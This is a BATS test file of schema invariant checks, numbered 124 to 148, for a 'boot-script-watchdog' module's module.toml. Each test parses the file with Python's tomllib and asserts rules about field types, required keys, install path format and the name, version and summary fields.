@test "INVARIANT (boot-script-watchdog module.toml [profiles] available field is a TOML list — TOML-profiles-available-list-canonical 124)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
a = (data.get('profiles') or {}).get('available')
assert isinstance(a, list), f'profiles.available must be list, got {type(a).__name__}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml [profiles] available list contains at least one element — TOML-profiles-available-non-empty-canonical 125)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
a = (data.get('profiles') or {}).get('available') or []
assert isinstance(a, list) and len(a) >= 1, f'profiles.available must be non-empty list, got {a!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml [profiles] default value appears in [profiles] available list (semantic consistency) — TOML-profiles-default-in-available-canonical 126)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
p = data.get('profiles') or {}
default = p.get('default')
available = p.get('available') or []
assert default in available, f'profiles.default {default!r} must appear in available {available!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml [profiles] available list contains only string elements — TOML-profiles-available-elements-string-canonical 127)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
a = (data.get('profiles') or {}).get('available') or []
assert all(isinstance(x, str) for x in a), f'profiles.available items must all be strings, got {[type(x).__name__ for x in a]!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml requires list elements are inline-tables with kind+value keys (or empty) — TOML-requires-elements-shape-canonical 128)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
r = data.get('requires') or []
for el in r:
    assert isinstance(el, dict), f'requires element must be inline-table, got {type(el).__name__}'
    assert 'kind' in el and 'value' in el, f'requires element must have kind+value keys, got {sorted(el.keys())!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml requires items have kind in bounded vocab {binary, package, kernel-feature} — TOML-requires-kind-vocab-canonical 129)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
r = data.get('requires') or []
allowed = {'binary', 'package', 'kernel-feature'}
for el in r:
    k = el.get('kind', '')
    assert k in allowed, f'requires.kind must be in {allowed}, got {k!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml requires items have value as non-empty string — TOML-requires-value-nonempty-canonical 130)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
r = data.get('requires') or []
for el in r:
    v = el.get('value', '')
    assert isinstance(v, str) and v, f'requires.value must be non-empty string, got {v!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml provides list elements are all non-empty strings — TOML-provides-elements-string-canonical 131)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
p = data.get('provides') or []
for el in p:
    assert isinstance(el, str) and el, f'provides element must be non-empty string, got {el!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml conflicts list elements are all non-empty strings (or empty list) — TOML-conflicts-elements-string-canonical 132)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
c = data.get('conflicts') or []
for el in c:
    assert isinstance(el, str) and el, f'conflicts element must be non-empty string, got {el!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml consumes list elements are all non-empty strings (or empty) — TOML-consumes-elements-string-canonical 133)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
c = data.get('consumes') or []
for el in c:
    assert isinstance(el, str) and el, f'consumes element must be non-empty string, got {el!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml depends_on list elements are all non-empty strings (or empty) — TOML-depends-on-elements-string-canonical 134)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
c = data.get('depends_on') or []
for el in c:
    assert isinstance(el, str) and el, f'depends_on element must be non-empty string, got {el!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml install_paths.paths list elements are all absolute paths (starting with /) — TOML-install-paths-paths-absolute-canonical 135)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ip = data.get('install_paths') or {}
paths = ip.get('paths') or []
for el in paths:
    assert isinstance(el, str) and el and el.startswith('/'), f'install_paths.paths element must be absolute path, got {el!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml install_paths.paths list elements are unique (no duplicates) — TOML-install-paths-paths-unique-canonical 136)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ip = data.get('install_paths') or {}
paths = ip.get('paths') or []
assert len(paths) == len(set(paths)), f'install_paths.paths must be unique, duplicates: {[p for p in paths if paths.count(p) > 1]!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml name field matches kebab-case pattern [a-z][a-z0-9-]+ — TOML-name-kebab-case-canonical 137)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
import re
n = data.get('name', '')
assert re.fullmatch(r'[a-z][a-z0-9-]+', n), f'name must match kebab-case [a-z][a-z0-9-]+, got {n!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml requires items have exactly the {kind, value} keyset (no extras) — TOML-requires-elements-strict-keys-canonical 138)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
r = data.get('requires') or []
for el in r:
    assert set(el.keys()) == {'kind', 'value'}, f'requires element must have exactly kind+value keys, got {sorted(el.keys())!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml install_paths.paths elements use FHS-canonical prefixes {/etc, /var, /usr, /run, /opt} — TOML-install-paths-fhs-prefix-canonical 139)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ip = data.get('install_paths') or {}
paths = ip.get('paths') or []
prefixes = ('/etc/', '/var/', '/usr/', '/run/', '/opt/')
for el in paths:
    assert any(el.startswith(pf) for pf in prefixes), f'install_paths.paths element must use FHS-canonical prefix {prefixes}, got {el!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml install_paths.paths elements do not end with trailing slash — TOML-install-paths-no-trailing-slash-canonical 140)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ip = data.get('install_paths') or {}
paths = ip.get('paths') or []
for el in paths:
    assert not el.endswith('/'), f'install_paths.paths element must not end with /, got {el!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml install_paths.paths elements do not contain double slashes (// not allowed) — TOML-install-paths-no-double-slash-canonical 141)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ip = data.get('install_paths') or {}
paths = ip.get('paths') or []
for el in paths:
    assert '//' not in el, f'install_paths.paths element must not contain //, got {el!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml name field length is between 3 and 50 chars — TOML-name-length-bounded-canonical 142)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
n = data.get('name', '')
assert isinstance(n, str) and 3 <= len(n) <= 50, f'name length must be in [3,50], got len={len(n)} value={n!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml version field starts with 0. (pre-1.0 development) — TOML-version-pre-1-0-canonical 143)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
v = data.get('version', '')
assert isinstance(v, str) and v.startswith('0.'), f'version must start with 0. (pre-1.0), got {v!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml install_paths.paths list is non-empty (at least 1 element) — TOML-install-paths-paths-nonempty-canonical 144)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ip = data.get('install_paths') or {}
paths = ip.get('paths') or []
assert isinstance(paths, list) and len(paths) >= 1, f'install_paths.paths must be non-empty list, got {paths!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml install_paths.paths elements have no leading/trailing whitespace — TOML-install-paths-no-edge-whitespace-canonical 145)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ip = data.get('install_paths') or {}
paths = ip.get('paths') or []
for el in paths:
    assert el == el.strip(), f'install_paths.paths element must not have edge-whitespace, got {el!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml summary field value has no leading/trailing whitespace — TOML-summary-no-edge-whitespace-canonical 146)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
s = data.get('summary', '')
assert isinstance(s, str) and s == s.strip(), f'summary must not have edge-whitespace, got {s[:20]!r}...'
"
}

@test "INVARIANT (boot-script-watchdog module.toml summary field value contains no tab characters — TOML-summary-no-tab-canonical 147)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
s = data.get('summary', '')
assert isinstance(s, str) and '\t' not in s, f'summary must not contain tab char'
"
}

@test "INVARIANT (boot-script-watchdog module.toml summary field value is single-line (no newlines, no CR) — TOML-summary-single-line-canonical 148)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
s = data.get('summary', '')
assert isinstance(s, str) and '\n' not in s and '\r' not in s, f'summary must be single-line, found newline/CR'
"
}
